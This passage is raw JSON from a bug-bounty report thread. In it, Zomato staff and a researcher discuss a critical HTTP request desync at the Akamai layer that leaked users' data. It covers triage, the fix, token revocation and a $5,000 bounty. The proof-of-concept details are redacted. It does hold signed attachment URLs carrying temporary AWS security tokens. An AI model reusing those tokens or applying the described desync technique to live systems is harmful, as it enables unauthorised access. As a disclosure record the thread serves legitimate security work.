go:\u003cbr\u003e\n████\u003cbr\u003e\nBest,\u003cbr\u003e\n\u003ca href=\"/defparam\"\u003e@defparam\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-10T15:14:01.733Z","updated_at":"2020-07-09T05:25:16.016Z","actor":{"username":"defparam","cleared":true,"url":"/defparam","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JpEU5FW9AQumZTKECZJJq1nu/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6736867,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@defparam, \n\nI am able to reproduce the behavior you are describing in the provided video PoC, I am asking for the video PoC showing other users PII leak to assess the severity of the issue. \n\nThanks \n@ehsahil\n\n","markdown_message":"\u003cp\u003e\u003ca href=\"/defparam\"\u003e@defparam\u003c/a\u003e, \u003c/p\u003e\n\n\u003cp\u003eI am able to reproduce the behavior you are describing in the provided video PoC, I am asking for the video PoC showing other users PII leak to assess the severity of the issue. \u003c/p\u003e\n\n\u003cp\u003eThanks \u003cbr\u003e\n\u003ca href=\"/ehsahil\"\u003e@ehsahil\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-10T15:22:58.646Z","updated_at":"2020-01-10T15:22:58.646Z","actor":{"username":"biryani-is-lob","cleared":false,"url":"/biryani-is-lob","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/sYPtN4bJVr35fXwTxNPhuBtp/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6736953,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@ehsahil,\n\nAh, I'm sorry! I misunderstood. Here is the sequel to my movie part 2 (lol)\n████████\n\nBest,\n@defparam","markdown_message":"\u003cp\u003e\u003ca href=\"/ehsahil\"\u003e@ehsahil\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eAh, I\u0026#39;m sorry! I misunderstood. Here is the sequel to my movie part 2 (lol)\u003cbr\u003e\n████████\u003c/p\u003e\n\n\u003cp\u003eBest,\u003cbr\u003e\n\u003ca href=\"/defparam\"\u003e@defparam\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-10T15:33:25.857Z","updated_at":"2020-07-09T05:24:54.867Z","actor":{"username":"defparam","cleared":true,"url":"/defparam","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JpEU5FW9AQumZTKECZJJq1nu/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6737038,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi @defparam, \n\nThanks for the video PoC, we’re working on the fix, requesting you to stop your testing right away.\n\nWe will get back to you once we have an update.\n\nThanks\n@ehsahil-zomato ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/defparam\"\u003e@defparam\u003c/a\u003e, \u003c/p\u003e\n\n\u003cp\u003eThanks for the video PoC, we’re working on the fix, requesting you to stop your testing right away.\u003c/p\u003e\n\n\u003cp\u003eWe will get back to you once we have an update.\u003c/p\u003e\n\n\u003cp\u003eThanks\u003cbr\u003e\n\u003ca href=\"/ehsahil-zomato\"\u003e@ehsahil-zomato\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-10T15:46:15.798Z","updated_at":"2020-01-10T15:46:15.798Z","actor":{"username":"biryani-is-lob","cleared":false,"url":"/biryani-is-lob","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/sYPtN4bJVr35fXwTxNPhuBtp/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6741389,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @defparam - Awesome find. Out of curiosity, are you still testing it? ████████\n\nWe’re working on the fix.\n\nPrateek","markdown_message":"\u003cp\u003eHi \u003ca href=\"/defparam\"\u003e@defparam\u003c/a\u003e - Awesome find. Out of curiosity, are you still testing it? ████████\u003c/p\u003e\n\n\u003cp\u003eWe’re working on the fix.\u003c/p\u003e\n\n\u003cp\u003ePrateek\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-11T02:42:49.860Z","updated_at":"2020-07-09T05:27:41.864Z","actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6741390,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-01-11T02:43:22.327Z","updated_at":"2020-01-11T02:43:22.327Z","additional_data":{"old_severity":"Critical","new_severity":"Critical (9.8)","old_severity_id":604547,"new_severity_id":604968},"actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6741520,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@prateek_0490-zomato ,\n\nI've only ran a handful of tests today and that was to make the video for @ehsahil-zomato, Since then I haven't touched the asset and I've double check my machine, I have no traffic being sent to Zomato.\nLast time I sent continuous traffic was thursday evening eastern standard timezone. Once I found the bug I finished testing and sent my report the next morning (today).\n\nBest,\n@defparam","markdown_message":"\u003cp\u003e\u003ca href=\"/prateek_0490-zomato\"\u003e@prateek_0490-zomato\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ve only ran a handful of tests today and that was to make the video for \u003ca href=\"/ehsahil-zomato\"\u003e@ehsahil-zomato\u003c/a\u003e, Since then I haven\u0026#39;t touched the asset and I\u0026#39;ve double check my machine, I have no traffic being sent to Zomato.\u003cbr\u003e\nLast time I sent continuous traffic was thursday evening eastern standard timezone. Once I found the bug I finished testing and sent my report the next morning (today).\u003c/p\u003e\n\n\u003cp\u003eBest,\u003cbr\u003e\n\u003ca href=\"/defparam\"\u003e@defparam\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-11T03:25:21.519Z","updated_at":"2020-01-11T03:25:21.519Z","actor":{"username":"defparam","cleared":true,"url":"/defparam","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JpEU5FW9AQumZTKECZJJq1nu/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6755781,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @defparam - thanks, just a quick update - we're still working on it. We're taking multiple steps to mitigate this issue and apart from this we're also proactively adding checks to avoid such vulnerabilities.\n\nAgain, this was a great find. Keep Hunting.\n\nP.S. - We're deciding on the bounty, please allow us time to get back.\n\nPrateek","markdown_message":"\u003cp\u003eHi \u003ca href=\"/defparam\"\u003e@defparam\u003c/a\u003e - thanks, just a quick update - we\u0026#39;re still working on it. We\u0026#39;re taking multiple steps to mitigate this issue and apart from this we\u0026#39;re also proactively adding checks to avoid such vulnerabilities.\u003c/p\u003e\n\n\u003cp\u003eAgain, this was a great find. Keep Hunting.\u003c/p\u003e\n\n\u003cp\u003eP.S. - We\u0026#39;re deciding on the bounty, please allow us time to get back.\u003c/p\u003e\n\n\u003cp\u003ePrateek\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-13T13:28:01.129Z","updated_at":"2020-01-13T13:28:01.129Z","actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6755827,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @prateek_0490-zomato ,\n\nMany thanks! Take your time, there's no rush here on my end. I'm happy to test the remedies once they are staged.\n\nBest Regards,\n@defparam","markdown_message":"\u003cp\u003eHey \u003ca href=\"/prateek_0490-zomato\"\u003e@prateek_0490-zomato\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eMany thanks! Take your time, there\u0026#39;s no rush here on my end. I\u0026#39;m happy to test the remedies once they are staged.\u003c/p\u003e\n\n\u003cp\u003eBest Regards,\u003cbr\u003e\n\u003ca href=\"/defparam\"\u003e@defparam\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-13T13:32:29.184Z","updated_at":"2020-01-13T13:32:29.184Z","actor":{"username":"defparam","cleared":true,"url":"/defparam","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JpEU5FW9AQumZTKECZJJq1nu/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6765672,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @defparam - We've deployed a fix, we will still be hardening it a bit more throughout the week.\n\nLet me explain you about what was actually happening - so, basically this was happening at the AKAMAI level where the request were getting poisoned which lead to the issue and ideally those requests never reached our backend servers. Below rough illustration should give you a better idea -\n\n{F684136}\n\nAdditionally, we are still investigating and figuring out the users who got affected because of this and as a precautionary measure we will be revoking their tokens. Initial investigation shows the count isn't exceeding hundred. Could you please confirm if the below IP is of your Digital Ocean instance -\n\n- 159.8█████\n\nMoreover, can you please go ahead and retest all the possible scenarios and try to bypass the current fixes in place? We really appreciate your help and cooperation in keeping @Zomato secure :)\n\nLooking forward to hear back.\n\nPrateek","markdown_message":"\u003cp\u003eHi \u003ca href=\"/defparam\"\u003e@defparam\u003c/a\u003e - We\u0026#39;ve deployed a fix, we will still be hardening it a bit more throughout the week.\u003c/p\u003e\n\n\u003cp\u003eLet me explain you about what was actually happening - so, basically this was happening at the AKAMAI level where the request were getting poisoned which lead to the issue and ideally those requests never reached our backend servers. Below rough illustration should give you a better idea -\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"smuggle_akamai.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/doHBwrqAwALmoohri5axfLpm?response-content-disposition=attachment%3B%20filename%3D%22smuggle_akamai.png%22%3B%20filename%2A%3DUTF-8%27%27smuggle_akamai.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQVHABZQ6K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T064936Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDLEUqN2OLO3OoArpAduXGS%2FnWvclGJ7L%2FhS7ZlCNuSFwIhAKgaDWYosUsMZYxmwMD0tSfLg1FWhbQHhU86z2hns38zKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgwVVQvbJjCbXZyRbMQqkQM9XNobju5ij3mHEd1PgXrpuzeU%2BCZaLl8s8%2FXPts8hYLholdRFqlYhDzTmecfnLqTs%2FH8df0Fzv8NVTOhsz9Cu3LtPJmYcyMM6%2BCttQ0%2F5YV36HpOoKx7YBCXq6g1wpqiR5h0NB8nCyNbtahjtqqfKrkQsAJtF0n6vty0Dy5dIMaKZufttk1eoYubwLgfaN4YAthfVEyCI75XoSBcWtozJGhmqio20Kggp%2Ff9ESWUDjkkVQkVc66j8SevucVwBZgdZjxbmMc3p%2B%2FrtliE8Di2Ov48U%2Bmiyzxgy0RsqgwBWQeuC1Vvrs6a5UgzB5X13VoO7Zw2O5pS1EKsi0EwbwxD1t1gkpOGC1X37B6qMMiSraZswcogi35QEMA8XAQhIC2z%2Byugz3gdhCR4lBTeHgZARRoRQvNYoLHEkvjD4clJ4fdfbD%2FRcWQb953U%2BunjxQu2802uN7zsOYAZ%2F1SufQ8paJbIHLgiZu%2FJLfuV6RY9q9hQTpnm6QoNT4fkLlHao602RIKkBGhLK4iU4VXdLBpw5JDCJiav%2FBTrqAW2UJwXizthXBPPIZ57e77V%2B1Jr9Up7MhIMK722MpJQ5S6y2sEj0IRzF6bBvFIGcuc7s5TvUPI3RoSg3%2BoRepHEHQDZpJfcEB%2FPh8Jr6a8ILTQYD91llJENl%2B%2FADn1n%2B0ihsitf2dEU%2F8Jff%2FNN3i9J2juS2OvqLeEbMdBuCToL%2BbYC8hsevJk6YzpVS0q2WxfTPUq4t7RHDwzTYfPmQnso8MCFcSKpUgp39ZmtjV4S1TWj23dyd7WkHgRbrIsNiFZci3GJYaEnzJmzKDIghO7k6z8NutfGp8Ayl%2FCKxt1goZhsy13ssETolsg%3D%3D\u0026amp;X-Amz-Signature=cbe2740b53df7caa49d45ebb11aad9b3f560006cb23b493eae0160fcf393c3ee\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/doHBwrqAwALmoohri5axfLpm?response-content-disposition=attachment%3B%20filename%3D%22smuggle_akamai.png%22%3B%20filename%2A%3DUTF-8%27%27smuggle_akamai.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQVHABZQ6K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T064936Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDLEUqN2OLO3OoArpAduXGS%2FnWvclGJ7L%2FhS7ZlCNuSFwIhAKgaDWYosUsMZYxmwMD0tSfLg1FWhbQHhU86z2hns38zKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgwVVQvbJjCbXZyRbMQqkQM9XNobju5ij3mHEd1PgXrpuzeU%2BCZaLl8s8%2FXPts8hYLholdRFqlYhDzTmecfnLqTs%2FH8df0Fzv8NVTOhsz9Cu3LtPJmYcyMM6%2BCttQ0%2F5YV36HpOoKx7YBCXq6g1wpqiR5h0NB8nCyNbtahjtqqfKrkQsAJtF0n6vty0Dy5dIMaKZufttk1eoYubwLgfaN4YAthfVEyCI75XoSBcWtozJGhmqio20Kggp%2Ff9ESWUDjkkVQkVc66j8SevucVwBZgdZjxbmMc3p%2B%2FrtliE8Di2Ov48U%2Bmiyzxgy0RsqgwBWQeuC1Vvrs6a5UgzB5X13VoO7Zw2O5pS1EKsi0EwbwxD1t1gkpOGC1X37B6qMMiSraZswcogi35QEMA8XAQhIC2z%2Byugz3gdhCR4lBTeHgZARRoRQvNYoLHEkvjD4clJ4fdfbD%2FRcWQb953U%2BunjxQu2802uN7zsOYAZ%2F1SufQ8paJbIHLgiZu%2FJLfuV6RY9q9hQTpnm6QoNT4fkLlHao602RIKkBGhLK4iU4VXdLBpw5JDCJiav%2FBTrqAW2UJwXizthXBPPIZ57e77V%2B1Jr9Up7MhIMK722MpJQ5S6y2sEj0IRzF6bBvFIGcuc7s5TvUPI3RoSg3%2BoRepHEHQDZpJfcEB%2FPh8Jr6a8ILTQYD91llJENl%2B%2FADn1n%2B0ihsitf2dEU%2F8Jff%2FNN3i9J2juS2OvqLeEbMdBuCToL%2BbYC8hsevJk6YzpVS0q2WxfTPUq4t7RHDwzTYfPmQnso8MCFcSKpUgp39ZmtjV4S1TWj23dyd7WkHgRbrIsNiFZci3GJYaEnzJmzKDIghO7k6z8NutfGp8Ayl%2FCKxt1goZhsy13ssETolsg%3D%3D\u0026amp;X-Amz-Signature=cbe2740b53df7caa49d45ebb11aad9b3f560006cb23b493eae0160fcf393c3ee\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eAdditionally, we are still investigating and figuring out the users who got affected because of this and as a precautionary measure we will be revoking their tokens. Initial investigation shows the count isn\u0026#39;t exceeding hundred. Could you please confirm if the below IP is of your Digital Ocean instance -\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e159.8█████\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eMoreover, can you please go ahead and retest all the possible scenarios and try to bypass the current fixes in place? We really appreciate your help and cooperation in keeping \u003ca href=\"/zomato\"\u003e@Zomato\u003c/a\u003e secure :)\u003c/p\u003e\n\n\u003cp\u003eLooking forward to hear back.\u003c/p\u003e\n\n\u003cp\u003ePrateek\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-14T09:51:08.559Z","updated_at":"2020-07-09T05:29:47.510Z","actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":684136,"filename":"smuggle_akamai.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/doHBwrqAwALmoohri5axfLpm?response-content-disposition=attachment%3B%20filename%3D%22smuggle_akamai.png%22%3B%20filename%2A%3DUTF-8%27%27smuggle_akamai.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVHABZQ6K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T064936Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDLEUqN2OLO3OoArpAduXGS%2FnWvclGJ7L%2FhS7ZlCNuSFwIhAKgaDWYosUsMZYxmwMD0tSfLg1FWhbQHhU86z2hns38zKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgwVVQvbJjCbXZyRbMQqkQM9XNobju5ij3mHEd1PgXrpuzeU%2BCZaLl8s8%2FXPts8hYLholdRFqlYhDzTmecfnLqTs%2FH8df0Fzv8NVTOhsz9Cu3LtPJmYcyMM6%2BCttQ0%2F5YV36HpOoKx7YBCXq6g1wpqiR5h0NB8nCyNbtahjtqqfKrkQsAJtF0n6vty0Dy5dIMaKZufttk1eoYubwLgfaN4YAthfVEyCI75XoSBcWtozJGhmqio20Kggp%2Ff9ESWUDjkkVQkVc66j8SevucVwBZgdZjxbmMc3p%2B%2FrtliE8Di2Ov48U%2Bmiyzxgy0RsqgwBWQeuC1Vvrs6a5UgzB5X13VoO7Zw2O5pS1EKsi0EwbwxD1t1gkpOGC1X37B6qMMiSraZswcogi35QEMA8XAQhIC2z%2Byugz3gdhCR4lBTeHgZARRoRQvNYoLHEkvjD4clJ4fdfbD%2FRcWQb953U%2BunjxQu2802uN7zsOYAZ%2F1SufQ8paJbIHLgiZu%2FJLfuV6RY9q9hQTpnm6QoNT4fkLlHao602RIKkBGhLK4iU4VXdLBpw5JDCJiav%2FBTrqAW2UJwXizthXBPPIZ57e77V%2B1Jr9Up7MhIMK722MpJQ5S6y2sEj0IRzF6bBvFIGcuc7s5TvUPI3RoSg3%2BoRepHEHQDZpJfcEB%2FPh8Jr6a8ILTQYD91llJENl%2B%2FADn1n%2B0ihsitf2dEU%2F8Jff%2FNN3i9J2juS2OvqLeEbMdBuCToL%2BbYC8hsevJk6YzpVS0q2WxfTPUq4t7RHDwzTYfPmQnso8MCFcSKpUgp39ZmtjV4S1TWj23dyd7WkHgRbrIsNiFZci3GJYaEnzJmzKDIghO7k6z8NutfGp8Ayl%2FCKxt1goZhsy13ssETolsg%3D%3D\u0026X-Amz-Signature=cbe2740b53df7caa49d45ebb11aad9b3f560006cb23b493eae0160fcf393c3ee"}],"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6767592,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @prateek_0490-zomato ,\n\nVery interesting! I did not expect that the desync had been solely contained within Akamai! One interesting this about this finding is that I would have normally ran my array of desync tests on Zomato and moved on happy. This is because for my normal tests I usually use the **GET** or **POST** http verbs which showed that **api.zomato.com** passed with no desync problems. However, for some reason I decided to retest using the **DELETE** verb and this is where I saw all the desync issues listed in my tool. I'm glad I found it because now I'm sure to perform my desync tests across a variety of HTTP verbs going forward. Thanks for the write up!\n\nYes I can confirm that ``159.8███`` is my digital ocean instance ;)\n\nI re-ran my tests and I see no issues at all with the asset now.\n███████\n███\n███████\n███████\n\nSuper interesting bug, Thanks!\nBest,\n@defparam\n\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/prateek_0490-zomato\"\u003e@prateek_0490-zomato\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eVery interesting! I did not expect that the desync had been solely contained within Akamai! One interesting this about this finding is that I would have normally ran my array of desync tests on Zomato and moved on happy. This is because for my normal tests I usually use the \u003cstrong\u003eGET\u003c/strong\u003e or \u003cstrong\u003ePOST\u003c/strong\u003e http verbs which showed that \u003cstrong\u003eapi.zomato.com\u003c/strong\u003e passed with no desync problems. However, for some reason I decided to retest using the \u003cstrong\u003eDELETE\u003c/strong\u003e verb and this is where I saw all the desync issues listed in my tool. I\u0026#39;m glad I found it because now I\u0026#39;m sure to perform my desync tests across a variety of HTTP verbs going forward. Thanks for the write up!\u003c/p\u003e\n\n\u003cp\u003eYes I can confirm that \u003ccode\u003e159.8███\u003c/code\u003e is my digital ocean instance ;)\u003c/p\u003e\n\n\u003cp\u003eI re-ran my tests and I see no issues at all with the asset now.\u003cbr\u003e\n███████\u003cbr\u003e\n███\u003cbr\u003e\n███████\u003cbr\u003e\n███████\u003c/p\u003e\n\n\u003cp\u003eSuper interesting bug, Thanks!\u003cbr\u003e\nBest,\u003cbr\u003e\n\u003ca href=\"/defparam\"\u003e@defparam\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-14T13:51:10.872Z","updated_at":"2020-07-09T05:29:47.506Z","actor":{"username":"defparam","cleared":true,"url":"/defparam","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JpEU5FW9AQumZTKECZJJq1nu/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6767713,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Awesome, thanks much for the confirmation, @defparam :)\n\nAKAMAI is also rolling out the fix at their platform level in couple of days, I'll keep the report open until then and will request you to retest it again once that has been deployed.\n\nWe've been reviewing/investigating report for bounty, so expect to hear back by end of this week. Looking forward to receive some more awesome reports from you. Happy hunting!\n\nThanks again for helping us keep @Zomato safe and secure for our users.\n\nPrateek","markdown_message":"\u003cp\u003eAwesome, thanks much for the confirmation, \u003ca href=\"/defparam\"\u003e@defparam\u003c/a\u003e :)\u003c/p\u003e\n\n\u003cp\u003eAKAMAI is also rolling out the fix at their platform level in couple of days, I\u0026#39;ll keep the report open until then and will request you to retest it again once that has been deployed.\u003c/p\u003e\n\n\u003cp\u003eWe\u0026#39;ve been reviewing/investigating report for bounty, so expect to hear back by end of this week. Looking forward to receive some more awesome reports from you. Happy hunting!\u003c/p\u003e\n\n\u003cp\u003eThanks again for helping us keep \u003ca href=\"/zomato\"\u003e@Zomato\u003c/a\u003e safe and secure for our users.\u003c/p\u003e\n\n\u003cp\u003ePrateek\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-14T14:08:25.405Z","updated_at":"2020-01-14T14:08:25.405Z","actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6794400,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"This was a great research @defparam, although our max bounty is $2K but this was an outstanding find. Keep Hunting.\n\nThanks!","markdown_message":"\u003cp\u003eThis was a great research \u003ca href=\"/defparam\"\u003e@defparam\u003c/a\u003e, although our max bounty is $2K but this was an outstanding find. Keep Hunting.\u003c/p\u003e\n\n\u003cp\u003eThanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-16T19:57:00.404Z","updated_at":"2020-01-16T19:57:00.404Z","actor":{"url":"/zomato","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Zomato"}},"bounty_amount":"5000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"zomato","collaborator":{"username":"defparam","url":"/defparam"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6794422,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @defparam - We're still awaiting to hear back from AKAMAI, once they release a platform level fix, we will update here and request you to please retest it to see if you can find a bypass.\n\nEnjoy the bounty and keep hunting!\n\nPrateek","markdown_message":"\u003cp\u003eHi \u003ca href=\"/defparam\"\u003e@defparam\u003c/a\u003e - We\u0026#39;re still awaiting to hear back from AKAMAI, once they release a platform level fix, we will update here and request you to please retest it to see if you can find a bypass.\u003c/p\u003e\n\n\u003cp\u003eEnjoy the bounty and keep hunting!\u003c/p\u003e\n\n\u003cp\u003ePrateek\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-16T20:00:09.298Z","updated_at":"2020-01-16T20:00:09.298Z","actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6794478,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks @Zomato !\n\nI'm honored on the bounty amount past your advertised max! It illustrates how critical the issue was and I'm glad the team fixed it in a timely manner. Once let me know when you need one last re-test and I'm happy to run it.\n\nThanks again for your generous bounty,\nBest,\n@defparam","markdown_message":"\u003cp\u003eThanks \u003ca href=\"/zomato\"\u003e@Zomato\u003c/a\u003e !\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;m honored on the bounty amount past your advertised max! It illustrates how critical the issue was and I\u0026#39;m glad the team fixed it in a timely manner. Once let me know when you need one last re-test and I\u0026#39;m happy to run it.\u003c/p\u003e\n\n\u003cp\u003eThanks again for your generous bounty,\u003cbr\u003e\nBest,\u003cbr\u003e\n\u003ca href=\"/defparam\"\u003e@defparam\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-16T20:10:35.290Z","updated_at":"2020-01-16T20:10:35.290Z","actor":{"username":"defparam","cleared":true,"url":"/defparam","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JpEU5FW9AQumZTKECZJJq1nu/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6835113,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@defparam - We're still awaiting to hear back on this, will keep you posted.\n\nPrateek","markdown_message":"\u003cp\u003e\u003ca href=\"/defparam\"\u003e@defparam\u003c/a\u003e - We\u0026#39;re still awaiting to hear back on this, will keep you 